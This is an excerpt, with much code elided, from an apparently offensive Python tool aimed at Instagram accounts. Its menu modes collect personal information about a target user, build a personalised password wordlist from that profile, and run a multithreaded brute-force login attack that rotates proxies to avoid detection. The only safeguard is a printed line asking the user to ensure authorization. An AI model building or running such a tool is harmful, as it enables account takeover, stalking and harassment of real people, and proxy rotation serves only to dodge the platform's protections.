...
from core.banner import (
    ...
    show_password_stats, show_progress_bar,
    R, G, Y, C, M, B, W, RE, console
)
...
def collect_personal_info(username):
    """Interactive collection of personal information about target."""
...
def mode_info_gathering():
    """Mode 1: Information gathering only."""
    show_banner()
...
def mode_password_generation():
    """Mode 2: AI Password generation only."""
    show_banner()
    ...
    engine = PasswordEngine(
        target_data=profile_data or {"username": username, "extracted_names": [], 
    ...
    # Save wordlist
    os.makedirs("output/wordlists", exist_ok=True)
    filepath = f"output/wordlists/{username}_passwords.txt"
    with open(filepath, 'w') as f:
...
def mode_full_attack():
    """Mode 3: Full attack - Info + Generation + Brute Force."""
    show_banner()
    ...
    console.print(f"\n{Y}[STEP 3/4] Generating AI-powered password list...{RE}")
    engine = PasswordEngine(
    ...
    print(f"\n{R}[WARNING] This will test {len(passwords):,} passwords")
    print(f"[WARNING] Ensure you have proper authorization!")
    ...
    attacker = BruteAttacker(username, passwords, proxy_rotator)
    
    def progress_callback(current, total, stats):
        pass
    
    found_password = attacker.start_attack(threads=threads, callback=progress_callback)
...
def mode_brute_force_only():
    """Mode 4: Brute force with existing wordlist."""
    show_banner()
    username = input(f"\n{C}[?] Enter target Instagram username: {W}@").strip()
    ...
    proxy_rotator = ProxyRotator()
    attacker = BruteAttacker(username, passwords, proxy_rotator)
    attacker.start_attack(threads=threads)

def mode_proxy_config():
    """Mode 5: Proxy management."""
    show_banner()
    proxy_rotator = ProxyRotator()
    ...
    while True:
        ...
        if choice == "1":
            ...
            if proxy_rotator.add_proxy(proxy):
                ...
                console.print(f"{Y}[!] Proxy already exists{RE}")
...
def mode_settings():
    """Mode 7: Settings and configuration."""
    show_banner()
    ...
    print(f"\n{Y}[*] Edit config/core/config.py to modify these settings{RE}")
